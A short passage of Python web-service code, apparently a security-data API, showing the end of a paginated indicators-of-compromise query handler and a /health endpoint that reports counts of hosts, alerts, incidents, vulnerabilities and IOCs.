    if err:
        return err
    rows, err = _query(request, IOCS, sort_sep=".")
    if err:
        return err
    return _cursor_page(request, rows, 2_000, "after")


@app.get("/health")
def health():
    return {"ok": True, "hosts": len(HOSTS), "alerts": len(ALERTS), "incidents": len(INCIDENTS),
            "vulnerabilities": len(VULNS), "iocs": len(IOCS)}
